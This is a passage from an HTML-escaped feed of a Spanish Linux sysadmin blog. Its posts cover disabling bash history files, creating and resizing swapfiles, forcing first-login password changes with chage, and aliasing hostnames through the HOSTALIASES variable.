&lt;li&gt;Cuando inicias sesión en &lt;strong&gt;bash&lt;/strong&gt;, se lee la lista del historial de comandos desde el fichero &lt;code&gt;~/.bash_history&lt;/code&gt;. Concretamente el fichero es el que indica el parámetro del &lt;em&gt;shell&lt;/em&gt; &lt;code&gt;HISTFILE&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Cada vez que escribes un comando, la lista en memoria se actualiza con el nuevo comando, quedando limitado por el parámetro de &lt;em&gt;shell&lt;/em&gt; &lt;code&gt;HISTSIZE&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Al salir de la sesión, las últimas &lt;code&gt;HISTFILESIZE&lt;/code&gt; líneas de la historia se escriben en &lt;code&gt;HISTFILE&lt;/code&gt;, para su uso en sesiones posteriores.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Eliminar el historial de comandos&lt;/h2&gt;
&lt;p&gt;Con esto en mente podemos hacer algunas modificaciones en los parámetros del &lt;em&gt;shell&lt;/em&gt; mediante el comando &lt;code&gt;set&lt;/code&gt; que puede tener consecuencias en el comportamiento del historial de comandos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Hacer un &lt;code&gt;unset&lt;/code&gt; de &lt;code&gt;HISTFILE&lt;/code&gt; va a causar que el histórico no se guarde en ningún fichero.&lt;/li&gt;
&lt;li&gt;Hacer un &lt;code&gt;set&lt;/code&gt; de &lt;code&gt;HISTSIZE&lt;/code&gt; a un valor dado, nos va a limitar los comandos recordados en la sesión de &lt;strong&gt;bash&lt;/strong&gt; actual.&lt;/li&gt;
&lt;li&gt;Hacer un &lt;code&gt;set&lt;/code&gt; de &lt;code&gt;HISTFILESIZE&lt;/code&gt; a un valor dado, va a limitar el número de comandos que se recuerden entre sesiones.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Considero interesante que los comandos se recuerden en esta sesión, pero no quiero que se guarden entre sesiones. En estos casos podemos limitar a 0 el valor de &lt;code&gt;HISTFILESIZE&lt;/code&gt;, con lo que el fichero &lt;code&gt;.bash_history&lt;/code&gt; quedaría vacío; otra opción es hacer un &lt;code&gt;unset&lt;/code&gt; de &lt;code&gt;HISTFILE&lt;/code&gt; para que el fichero no se guarde, y por lo tanto lo podamos eliminar sin que se recree.&lt;/p&gt;
&lt;p&gt;Para hacer estos &lt;code&gt;set&lt;/code&gt; y &lt;code&gt;unset&lt;/code&gt; permanentes, voy a utilizar el fichero &lt;code&gt;.bashrc&lt;/code&gt;, que nos permite ejecutarlos automáticamente en cada incio de sesión de &lt;strong&gt;bash&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@server:~$ tail -1 .bashrc
&lt;span class="nb"&gt;unset&lt;/span&gt; HISTFILE
gerard@server:~$ . .bashrc
gerard@server:~$ rm .bash_history
gerard@server:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto no vamos a volver a ver el molesto fichero, aunque mantenemos el historial de la sesión actual, que por defecto en &lt;strong&gt;Debian&lt;/strong&gt; se indica en el mismo fichero:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@server:~$ cat .bashrc
...
&lt;span class="c1"&gt;# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)&lt;/span&gt;
&lt;span class="nv"&gt;HISTSIZE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;
&lt;span class="nv"&gt;HISTFILESIZE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2000&lt;/span&gt;
...
&lt;span class="nb"&gt;unset&lt;/span&gt; HISTFILE
gerard@server:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso recordaríamos un máximo de 1000 comandos durante la sesión, pero no entre sesiones.&lt;/p&gt;
&lt;h2&gt;Otros shells&lt;/h2&gt;
&lt;p&gt;Ya hemos visto como se puede hacer con &lt;strong&gt;bash&lt;/strong&gt;, pero no siempre tenemos un &lt;em&gt;shell&lt;/em&gt; tan configurable; yo mismo utilizo mucho &lt;strong&gt;Alpine Linux&lt;/strong&gt; y su &lt;em&gt;shell&lt;/em&gt; no admite estas variables.&lt;/p&gt;
&lt;p&gt;Si os pasa esto, tenéis dos opciones:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Quitar todos los permisos de escritura en el fichero, para que la lista no se pueda escribir en el mismo (con lo que se perdería entre sesiones)&lt;/li&gt;
&lt;li&gt;Sustituir el fichero &lt;code&gt;.ash_history&lt;/code&gt; o similar por un &lt;em&gt;soft link&lt;/em&gt; a &lt;code&gt;/dev/null&lt;/code&gt;; esto hará que no se escriba nada y, si se lee, devolverá 0 bytes (interpretado como 0 comandos).&lt;/li&gt;
&lt;/ul&gt;</content><category term="bash"></category><category term="histfile"></category></entry><entry><title>Ampliando la memoria swap mediante swapfiles</title><link href="https://www.linuxsysadmin.ml/2018/07/ampliando-la-memoria-swap-mediante-swapfiles.html" rel="alternate"></link><published>2018-07-23T09:00:00+02:00</published><updated>2018-07-23T09:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-07-23:/2018/07/ampliando-la-memoria-swap-mediante-swapfiles.html</id><summary type="html">&lt;p&gt;Como ya sabéis, para escribir artículos, utilizo &lt;strong&gt;VirtualBox&lt;/strong&gt;. Últimamente no paro de clonar la misma imagen base una y otra vez, lo que me da un particionado idéntico. Sin embargo, cuando se trata de memoria &lt;em&gt;swap&lt;/em&gt;, no todas las instáncias clonadas necesitan la misma &lt;em&gt;swap&lt;/em&gt; y cambiarlo no es fácil …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Como ya sabéis, para escribir artículos, utilizo &lt;strong&gt;VirtualBox&lt;/strong&gt;. Últimamente no paro de clonar la misma imagen base una y otra vez, lo que me da un particionado idéntico. Sin embargo, cuando se trata de memoria &lt;em&gt;swap&lt;/em&gt;, no todas las instáncias clonadas necesitan la misma &lt;em&gt;swap&lt;/em&gt; y cambiarlo no es fácil.&lt;/p&gt;
&lt;p&gt;Si nos fijamos en la última versión de &lt;strong&gt;Ubuntu&lt;/strong&gt; podremos ver que una instalación básica &lt;strong&gt;no lleva partición &lt;em&gt;swap&lt;/em&gt;&lt;/strong&gt;. Lo que lleva es un fichero predimensionado que es utilizado como memoria &lt;em&gt;swap&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Hay detractores de este método, pero lo que no podemos negar es que es una forma muy cómoda de añadir más &lt;em&gt;swap&lt;/em&gt; o redimensionarla (casi) en caliente. Muchos proveedores de máquinas virtuales cloud ni siquiera nos dan una partición &lt;em&gt;swap&lt;/em&gt;, así que conocer este método nos puede ser muy útil.&lt;/p&gt;
&lt;h2&gt;Creando un swapfile&lt;/h2&gt;
&lt;p&gt;Supongamos que tenemos un servidor sin memoria &lt;em&gt;swap&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ free -m
              total        used        free      shared  buff/cache   available
Mem:            &lt;span class="m"&gt;492&lt;/span&gt;          &lt;span class="m"&gt;32&lt;/span&gt;         &lt;span class="m"&gt;409&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;          &lt;span class="m"&gt;50&lt;/span&gt;         &lt;span class="m"&gt;446&lt;/span&gt;
Swap:             &lt;span class="m"&gt;0&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;
gerard@cloudserver:~$ cat /proc/swaps
Filename                                Type            Size    Used    Priority
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para ir bien, un servidor no debería utilizarla, ya que impacta en el rendimiento, al ser más lento el disco que la memoria. Hay ocasiones en las que es legítimo usarla de forma temporal, o es preferible tenerla para evitar que nos tiren procesos por falta de memoria.&lt;/p&gt;
&lt;p&gt;Así pues, decidimos poner &lt;em&gt;swap&lt;/em&gt;, pero no tenemos un particionado que nos lo permita; vamos a recurrir a un &lt;em&gt;swapfile&lt;/em&gt;, que no es otra cosa que un fichero normal que es utilizado como dispositivo de bloques para ejercer de memoria &lt;em&gt;swap&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para ello necesitamos un fichero del tamaño de la &lt;em&gt;swap&lt;/em&gt; que necesitemos, con las únicas restricciones de pertenecer a &lt;em&gt;root&lt;/em&gt; y con permisos de lectura y escritura para el propio &lt;em&gt;root&lt;/em&gt;. Vamos a crearlo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ sudo dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/zero &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/swapfile &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1M &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;512&lt;/span&gt;
&lt;span class="m"&gt;512&lt;/span&gt;+0 registros leídos
&lt;span class="m"&gt;512&lt;/span&gt;+0 registros escritos
&lt;span class="m"&gt;536870912&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;537&lt;/span&gt; MB, &lt;span class="m"&gt;512&lt;/span&gt; MiB&lt;span class="o"&gt;)&lt;/span&gt; copied, &lt;span class="m"&gt;0&lt;/span&gt;,841317 s, &lt;span class="m"&gt;638&lt;/span&gt; MB/s
gerard@cloudserver:~$ sudo chown root:root /swapfile
gerard@cloudserver:~$ sudo chmod &lt;span class="m"&gt;600&lt;/span&gt; /swapfile
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con esto tenemos nuestro dispositivo de bloques. Lo siguiente es "formatearlo" como &lt;em&gt;swap&lt;/em&gt;. Esto se hace con el comando &lt;code&gt;mkswap&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ sudo mkswap /swapfile
Configurando espacio de intercambio versión &lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="nv"&gt;tamaño&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;512&lt;/span&gt; MiB &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;536866816&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;
sin etiqueta, &lt;span class="nv"&gt;UUID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;612fd4be-2ea4-4561-ab7d-81b33df5b7e5
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo queda activarlo, con el comando &lt;code&gt;swapon&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ sudo swapon /swapfile
gerard@cloudserver:~$ free -m
              total        used        free      shared  buff/cache   available
Mem:            &lt;span class="m"&gt;492&lt;/span&gt;          &lt;span class="m"&gt;32&lt;/span&gt;           &lt;span class="m"&gt;6&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;         &lt;span class="m"&gt;453&lt;/span&gt;         &lt;span class="m"&gt;446&lt;/span&gt;
Swap:           &lt;span class="m"&gt;511&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;         &lt;span class="m"&gt;511&lt;/span&gt;
gerard@cloudserver:~$ cat /proc/swaps
Filename                                Type            Size    Used    Priority
/swapfile                               file            &lt;span class="m"&gt;524284&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;       -1
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como nos gusta el resultado, configuramos el fichero &lt;code&gt;/etc/fstab&lt;/code&gt; para que se active automáticamente tras cada reinicio:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ grep swapfile /etc/fstab
/swapfile none swap defaults &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Ampliando el swapfile&lt;/h2&gt;
&lt;p&gt;Nos quedamos cortos de &lt;em&gt;swap&lt;/em&gt; y decidimos que necesitamos agrandar nuestra &lt;em&gt;swap&lt;/em&gt;. Solamente tenemos que desactivar el fichero, redimensionarlo, formatearlo y volver a activarlo; sin complicaciones:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ sudo swapoff /swapfile
gerard@cloudserver:~$ sudo dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/zero &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/swapfile &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1M &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1024&lt;/span&gt;
&lt;span class="m"&gt;1024&lt;/span&gt;+0 registros leídos
&lt;span class="m"&gt;1024&lt;/span&gt;+0 registros escritos
&lt;span class="m"&gt;1073741824&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;,1 GB, &lt;span class="m"&gt;1&lt;/span&gt;,0 GiB&lt;span class="o"&gt;)&lt;/span&gt; copied, &lt;span class="m"&gt;1&lt;/span&gt;,82175 s, &lt;span class="m"&gt;589&lt;/span&gt; MB/s
gerard@cloudserver:~$ sudo mkswap /swapfile
Configurando espacio de intercambio versión &lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="nv"&gt;tamaño&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1024&lt;/span&gt; MiB &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1073737728&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;
sin etiqueta, &lt;span class="nv"&gt;UUID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;fb036b45-6fca-4ff2-acb6-9ae585f08c74
gerard@cloudserver:~$ sudo swapon /swapfile
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya tenemos 1Gb de &lt;em&gt;swap&lt;/em&gt;, sin sorpresas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ free -m
              total        used        free      shared  buff/cache   available
Mem:            &lt;span class="m"&gt;492&lt;/span&gt;          &lt;span class="m"&gt;32&lt;/span&gt;           &lt;span class="m"&gt;6&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;         &lt;span class="m"&gt;453&lt;/span&gt;         &lt;span class="m"&gt;446&lt;/span&gt;
Swap:          &lt;span class="m"&gt;1023&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;        &lt;span class="m"&gt;1023&lt;/span&gt;
gerard@cloudserver:~$ cat /proc/swaps
Filename                                Type            Size    Used    Priority
/swapfile                               file            &lt;span class="m"&gt;1048572&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;       -1
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En un futuro cercano, decidimos que hay que poner más &lt;em&gt;swap&lt;/em&gt;. Ahora tenemos un nuevo problema: la &lt;em&gt;swap&lt;/em&gt; existente no se puede desactivar porque no hay memoria en donde mover lo que hay en &lt;em&gt;swap&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Eso no supone más problema, porque la memoria &lt;em&gt;swap&lt;/em&gt; es una masa que se forma a partir de varios dispositivos, así que podemos añadir otro, de la misma manera:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ sudo dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/zero &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/swapfile2 &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1M &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;3072&lt;/span&gt;
&lt;span class="m"&gt;3072&lt;/span&gt;+0 registros leídos
&lt;span class="m"&gt;3072&lt;/span&gt;+0 registros escritos
&lt;span class="m"&gt;3221225472&lt;/span&gt; bytes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;,2 GB, &lt;span class="m"&gt;3&lt;/span&gt;,0 GiB&lt;span class="o"&gt;)&lt;/span&gt; copied, &lt;span class="m"&gt;5&lt;/span&gt;,16648 s, &lt;span class="m"&gt;623&lt;/span&gt; MB/s
gerard@cloudserver:~$ sudo chown root:root /swapfile2
gerard@cloudserver:~$ sudo chmod &lt;span class="m"&gt;600&lt;/span&gt; /swapfile2
gerard@cloudserver:~$ sudo swapon /swapfile2
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y como esperamos, ahora tenemos un total de 4Gb de &lt;em&gt;swap&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@cloudserver:~$ free -m
              total        used        free      shared  buff/cache   available
Mem:            &lt;span class="m"&gt;492&lt;/span&gt;          &lt;span class="m"&gt;32&lt;/span&gt;           &lt;span class="m"&gt;6&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;         &lt;span class="m"&gt;452&lt;/span&gt;         &lt;span class="m"&gt;446&lt;/span&gt;
Swap:          &lt;span class="m"&gt;4095&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;        &lt;span class="m"&gt;4095&lt;/span&gt;
gerard@cloudserver:~$ cat /proc/swaps
Filename                                Type            Size    Used    Priority
/swapfile                               file            &lt;span class="m"&gt;1048572&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;       -1
/swapfile2                              file            &lt;span class="m"&gt;3145724&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;       -2
gerard@cloudserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto ya podríamos desactivar la primera &lt;em&gt;swap&lt;/em&gt;, ya sea para ampliarla, o para eliminarla. El contenido que tenía pasaría ahora a la segunda &lt;em&gt;swap&lt;/em&gt; en donde hemos creado espacio. Nada nos impide ampliar el primer fichero para eliminar el segundo, haciendo que la segunda &lt;em&gt;swap&lt;/em&gt; fuera solo un apaño temporal.&lt;/p&gt;</content><category term="memoria"></category><category term="swap"></category><category term="swapfile"></category></entry><entry><title>Contraseñas de un solo uso para usuarios linux</title><link href="https://www.linuxsysadmin.ml/2018/06/contrasenas-de-un-solo-uso-para-usuarios-linux.html" rel="alternate"></link><published>2018-06-18T10:00:00+02:00</published><updated>2018-06-18T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-06-18:/2018/06/contrasenas-de-un-solo-uso-para-usuarios-linux.html</id><summary type="html">&lt;p&gt;No dejan de sorprenderme los administradores de sistemas que crean usuarios a petición, pero les asignan &lt;em&gt;passwords&lt;/em&gt; supuestamente de un solo uso pidiéndoles que la cambien en el primer uso. La experiencia me dice que esa &lt;em&gt;password&lt;/em&gt; solo se cambia si es estrictamente necesario. Esta petición la puedes forzar fácilmente …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No dejan de sorprenderme los administradores de sistemas que crean usuarios a petición, pero les asignan &lt;em&gt;passwords&lt;/em&gt; supuestamente de un solo uso pidiéndoles que la cambien en el primer uso. La experiencia me dice que esa &lt;em&gt;password&lt;/em&gt; solo se cambia si es estrictamente necesario. Esta petición la puedes forzar fácilmente.&lt;/p&gt;
&lt;h2&gt;Un ejemplo&lt;/h2&gt;
&lt;p&gt;Vamos a simular una de estas peticiones, de un usuario &lt;em&gt;bob&lt;/em&gt; que quiere acceder a un servidor llamado &lt;em&gt;server&lt;/em&gt;. Un administrador tradicional va a ejecutar un comando estándar para crear el usuario, y le va a asignar una contraseña, posiblemente de diccionario.&lt;/p&gt;
&lt;h3&gt;El problema&lt;/h3&gt;
&lt;p&gt;El servidor en cuestión es un servidor simulado, montado con &lt;strong&gt;Alpine Linux&lt;/strong&gt;, y esto es lo que se ejecutaría en él:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ &lt;span class="c1"&gt;# adduser -D bob&lt;/span&gt;
/ &lt;span class="c1"&gt;# echo &amp;quot;bob:temporal&amp;quot; | chpasswd &lt;/span&gt;
chpasswd: password &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bob&amp;#39;&lt;/span&gt; changed
/ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Le mandamos el par de usuario y contraseña al usuario, muchas veces usando un canal relativamente inseguro, como el correo electrónico o mediante un &lt;em&gt;post-it&lt;/em&gt;. Le pedimos al usuario que la cambie, pero no podemos obligarle. Simplemente quiere entrar al servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/server$ ssh bob@server
bob@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &amp;lt;http://wiki.alpinelinux.org&amp;gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

server:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y tras ver que le funciona aparta la tarea y jamás se acuerda de cambiar su contraseña; otros directamente pasan de hacerlo, o se creen que su &lt;em&gt;post-it&lt;/em&gt; es ley; lo pegan en su monitor y la seguridad de la cuenta queda altamente comprometida.&lt;/p&gt;
&lt;h3&gt;La solución&lt;/h3&gt;
&lt;p&gt;La mejor forma que tenemos de forzar el cambio de la contraseña, sin tener demasiado trabajo, es delegarlo al sistema operativo. Las contraseñas en &lt;em&gt;linux&lt;/em&gt; pueden configurarse para &lt;strong&gt;caducar&lt;/strong&gt;. De hecho, directamente la podemos marcar como caducada, lo que va a forzar su cambio en el primer &lt;em&gt;login&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Esto se hace mediante el comando &lt;code&gt;chage&lt;/code&gt;, que nos permite el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-d&lt;/code&gt;, que es el que indica la fecha del último cambio de contraseña. Este &lt;em&gt;flag&lt;/em&gt; acepta el valor especial &lt;code&gt;0&lt;/code&gt; que obliga a que el usuario cambie su contraseña tras el primer &lt;em&gt;login&lt;/em&gt;. Esto se puede hacer en cualquier momento, pero es interesante hacerlo antes de mandarle la contraseña, cuando su usuario ya exista.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ &lt;span class="c1"&gt;# chage -d 0 bob&lt;/span&gt;
/ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: El comando &lt;code&gt;chage&lt;/code&gt; se encuentra en el paquete &lt;strong&gt;shadow&lt;/strong&gt; en &lt;strong&gt;Alpine Linux&lt;/strong&gt;; otras distribuciones lo tienen en el paquete &lt;strong&gt;passwd&lt;/strong&gt;. Si no disponéis del comando, instalad el paquete adecuado.&lt;/p&gt;
&lt;p&gt;El resultado es que el usuario va a poder entrar, pero no va a poder hacer nada hasta que haga un cambio de contraseña de forma exitosa. Por supuesto, esto invalida la contraseña temporal que le hayamos podido dar, y hace de nuestro servidor un lugar un poco más seguro.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/server$ ssh bob@server
bob@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &amp;lt;http://wiki.alpinelinux.org&amp;gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

WARNING: Your password has expired.
You must change your password now and login again!
Changing password &lt;span class="k"&gt;for&lt;/span&gt; bob.
Current password: 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí, depende del usuario saber donde apunta la contraseña y con quien la comparte.&lt;/p&gt;</content><category term="password"></category><category term="temporal"></category><category term="caducar"></category></entry><entry><title>Explorando bash: la variable de entorno HOSTALIASES</title><link href="https://www.linuxsysadmin.ml/2018/06/explorando-bash-la-variable-de-entorno-hostaliases.html" rel="alternate"></link><published>2018-06-04T10:00:00+02:00</published><updated>2018-06-04T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-06-04:/2018/06/explorando-bash-la-variable-de-entorno-hostaliases.html</id><summary type="html">&lt;p&gt;Muchas veces me he encontrado haciendo &lt;em&gt;demos&lt;/em&gt; con aplicaciones ejecutando en local o en un contenedor. Otras tantas el cliente ha hecho un montón de preguntas tontas referentes a porqué pone &lt;em&gt;localhost&lt;/em&gt;. En algunos de estos sistemas no disponía de acceso &lt;em&gt;root&lt;/em&gt; o &lt;em&gt;sudo&lt;/em&gt; para cambiar el fichero &lt;code&gt;/etc/hosts …&lt;/code&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchas veces me he encontrado haciendo &lt;em&gt;demos&lt;/em&gt; con aplicaciones ejecutando en local o en un contenedor. Otras tantas el cliente ha hecho un montón de preguntas tontas referentes a porqué pone &lt;em&gt;localhost&lt;/em&gt;. En algunos de estos sistemas no disponía de acceso &lt;em&gt;root&lt;/em&gt; o &lt;em&gt;sudo&lt;/em&gt; para cambiar el fichero &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;En estos casos, es especialmente interesante conocer la variable de &lt;strong&gt;bash&lt;/strong&gt; llamada &lt;strong&gt;HOSTALIASES&lt;/strong&gt;. Se trata de una variable de entorno que define un &lt;em&gt;path&lt;/em&gt; a un fichero, que va a ser una lista de &lt;em&gt;hosts&lt;/em&gt; y su &lt;em&gt;alias&lt;/em&gt;, aunque no soporta direcciones IP.&lt;/p&gt;
&lt;h2&gt;Un ejemplo simple: falseando un servidor, con un servicio local&lt;/h2&gt;
&lt;p&gt;Tanto si os pongo un ejemplo en este &lt;em&gt;blog&lt;/em&gt;, como si se trata de una &lt;em&gt;demo&lt;/em&gt; para un cliente, es muy habitual esconder el hecho de que no hay un servidor dedicado ni virtual mediante la exposición del puerto de un contenedor.&lt;/p&gt;
&lt;p&gt;Supongamos que tenemos un servidor web o de aplicaciones, empaquetado en una imagen &lt;strong&gt;docker&lt;/strong&gt;. Para la &lt;em&gt;demo&lt;/em&gt; lo ponemos a correr como contenedor. Como bien sabéis, buscar la dirección del contenedor suele ser pesado, así que optamos por exponer su puerto en la máquina local:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl http://localhost:8080/
Hello world
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: En realidad, el puerto 8080 de &lt;em&gt;localhost&lt;/em&gt; va a parar el puerto 8080 del contenedor, cuya función es irrelevante ahora mismo.&lt;/p&gt;
&lt;p&gt;Entonces viene el cliente, y en vez de fijarse en la aplicación misma, se fija en &lt;em&gt;localhost&lt;/em&gt;, y empieza con las preguntas tontas habituales:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;¿Por qué pone ahí localhost? Yo lo quiero en mi servidor, con redundancia y blah, blah, blah&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Y aquí es cuando se nos hinchan las narices y decidimos engañarlo, mediante una resolución DNS, aunque sea simulada; como no tenemos acceso a los archivos del sistema y no queremos tampoco dejar basura en ellos, tiramos de la variable de entorno &lt;strong&gt;HOSTALIASES&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ cat hosts 
tuserver localhost
gerard@sirius:~$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;HOSTALIASES&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/hosts
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y a partir de aquí, nadie tiene que enterarse de la localización exacta de la demo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl http://tuserver:8080/
Hello world
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


